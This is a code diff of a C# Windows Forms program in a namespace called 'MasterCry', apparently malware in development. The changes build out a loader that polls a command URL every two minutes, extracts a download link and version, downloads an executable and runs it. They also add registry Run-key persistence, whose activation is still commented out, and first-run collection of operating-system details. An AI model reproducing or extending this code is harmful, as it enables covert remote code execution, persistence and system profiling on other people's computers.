@@ -9,6 +9,7 @@
 *	
 ***********************************************************************************/
 
+using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -26,23 +27,16 @@ namespace MasterCry
         public Form1()
         {
             InitializeComponent();
-            if(!System.IO.File.Exists(BuildVars.Save_Location))
-                System_Details.getOperatingSystemInfo();
         }
 
+#region "Downloader"
         //Todo: Test Downloder
         private void Downloader()
         {
             var result = (new WebClient()).DownloadString(BuildVars.Command_URL);
 
-            int pFromURL = result.IndexOf("###") + "###".Length;
-            int pToURL = result.LastIndexOf("###");
-
-            int pFromVER = result.IndexOf("$$$") + "$$$".Length;
-            int pToVER = result.LastIndexOf("$$$");
-
-            String link = result.Substring(pFromURL, pToURL - pFromURL);
-            String ver = result.Substring(pFromVER, pToVER - pFromVER);
+            String link = ExtractData(result,BuildVars.Command_URL_Symbol);
+            String ver = ExtractData(result, BuildVars.Command_VER_Symbol);
 
             var preVer = System_Details.ReadSetting(BuildVars.Config_Command_Version);
 
@@ -50,11 +44,11 @@ namespace MasterCry
             {
                    try
                     {
-                    System_Details.AddUpdateAppSettings(BuildVars.Config_Command_Version, ver);
+                        System_Details.AddUpdateAppSettings(BuildVars.Config_Command_Version, ver);
                         using (WebClient wc = new WebClient())
                         {
                             wc.DownloadFileCompleted += WebClientDownloadCompleted;
-                            wc.DownloadFileAsync(new System.Uri(link),
+                            wc.DownloadFileAsync(new System.Uri(link),ver + 
                             BuildVars.Exe_Name);
                         }
                     }
@@ -64,12 +58,55 @@ namespace MasterCry
         }
         private void WebClientDownloadCompleted(object sender, AsyncCompletedEventArgs args)
         {
-            System.Diagnostics.Process.Start(BuildVars.Exe_Name);
+            System.Diagnostics.Process.Start(System_Details.ReadSetting(BuildVars.Config_Command_Version) + BuildVars.Exe_Name);
         }
-
+        private string ExtractData(string Result, string Symbol)
+        {
+            int pFrom = Result.IndexOf(Symbol) + Symbol.Length;
+            int pTo = Result.LastIndexOf(Symbol);
+            return Result.Substring(pFrom, pTo - pFrom);
+        }
+        #endregion
+        //Check Every 2 Min
         private void tmrURLCheck_Tick(object sender, EventArgs e)
         {
             Downloader();
+        }
+
+        #region "Startup"
+        private void RegisterInStartup(bool isChecked)
+        {
+            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
+                    (BuildVars.Registry_Key, true);
+            if (isChecked)
+            {
+                registryKey.SetValue(BuildVars.Registry_AppName, Application.ExecutablePath);
+            }
+            else
+            {
+                registryKey.DeleteValue(BuildVars.Registry_AppName);
+            }
+        }
+        public static bool CheckRegistryExists()
+        {
+            RegistryKey root;
+            root = Registry.CurrentUser.OpenSubKey(BuildVars.Registry_Key, false);
+
+            return root.GetValue(BuildVars.Registry_AppName) != null;
+        }
+
+        #endregion
+
+        //Todo: Enable StartUp
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            if (!System.IO.File.Exists(BuildVars.Save_Location))
+                System_Details.getOperatingSystemInfo();
+
+            //if (!CheckRegistryExists())
+            //{
+            //    RegisterInStartup(true);
+            //}
         }
     }
 }
